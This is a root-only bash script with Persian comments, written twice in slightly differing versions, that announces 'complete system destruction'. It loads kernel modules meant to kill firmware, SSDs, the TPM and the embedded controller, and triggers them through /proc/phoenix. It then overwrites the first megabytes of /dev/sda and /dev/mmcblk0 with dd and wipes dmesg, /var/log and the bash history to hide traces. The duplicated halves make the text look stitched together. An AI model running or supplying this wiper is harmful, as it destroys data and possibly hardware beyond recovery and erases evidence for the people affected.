#!/bin/bash
# اسکریپت فعال‌سازی تخریب کامل سیستم

if [ "$(id -u)" -ne 0 ]; then
    echo "این اسکریپت نیاز به دسترسی root دارد" >&2
    exit 1
fi

# بارگذاری ماژول‌های تخریب
insmod /lib/modules/$(uname -r)/kernel/drivers/phoenix/firmware_killer.ko
insmod /lib/modules/$(uname -r)/kernel/drivers/phoenix/ssd_terminator.ko
insmod /lib/modules/$(uname -r)/kernel/drivers/phoenix/tpm_eraser.ko

# فعال‌سازی تخریب
echo 1 > /proc/phoenix/activate

# اجرای تخریب در سطوح مختلف
echo "d" > /proc/phoenix/level  # تخریب عمیق (Deep)

# پاک‌سازی ردپاها
rmmod tpm_eraser
rmmod ssd_terminator
rmmod firmware_killer
dd if=/dev/zero of=/dev/sda bs=1M count=16
dmesg -C
rm -f /var/log/*

echo "تخریب سیستم با موفقیت آغاز شد. سیستم غیرقابل بازیابی خواهد بود."

# اسکریپت فعال‌سازی تخریب کامل

if [ "$(id -u)" -ne 0 ]; then
    echo "[-] نیاز به دسترسی root" >&2
    exit 1
fi

# بارگذاری ماژول‌ها
insmod core/firmware_destruct.ko
insmod core/ssd_terminator.ko
insmod core/tpm_eraser.ko
insmod core/ec_destroyer.ko

# فعال‌سازی تخریب
echo 1 > /proc/phoenix/activate

# اجرای تخریب در سطوح مختلف
echo "full" > /proc/phoenix/mode

# تأخیر برای اطمینان از اجرای کامل
sleep 10

# پاک‌سازی ردپاها
rmmod ec_destroyer
rmmod tpm_eraser
rmmod ssd_terminator
rmmod firmware_destruct

# تخریب ثانویه
dd if=/dev/urandom of=/dev/mmcblk0 bs=1M count=10
dmesg -C
rm -f /var/log/*
echo "" > ~/.bash_history

echo "[+] تخریب کامل سیستم با موفقیت انجام شد. سیستم غیرقابل بازیابی است."

